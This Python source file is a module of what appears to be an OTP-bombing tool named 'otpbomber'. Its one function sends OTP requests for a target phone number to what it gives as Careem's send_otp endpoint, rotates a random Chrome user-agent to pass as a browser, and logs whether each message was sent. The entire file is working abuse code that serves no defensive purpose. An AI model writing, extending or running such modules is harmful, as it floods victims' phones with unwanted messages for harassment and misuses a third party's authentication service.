from otpbomber.core import *
from otpbomber.localuseragent import *

async def careem(phone, client, out):
    name = 'careem'
    domain = 'careem.com'
    frequent_rate_limit = False
    headers = {'User-Agent': random.choice(ua['browsers']['chrome']), 'Content-Type': 'application/json'}
    json_data = {'mobile': f'92{phone[-10:]}'}
    try:
        response = await client.post('https://www.careem.com/api/auth/send_otp', headers=headers, json=json_data)
        if response.status_code == 200:
            out.append({'name': name, 'domain': domain, 'sent': True, 'error': False, 'rateLimit': False})
        else:
            out.append({'name': name, 'domain': domain, 'sent': False, 'error': False, 'rateLimit': False})
    except Exception:
        out.append({'name': name, 'domain': domain, 'sent': False, 'error': True, 'rateLimit': False})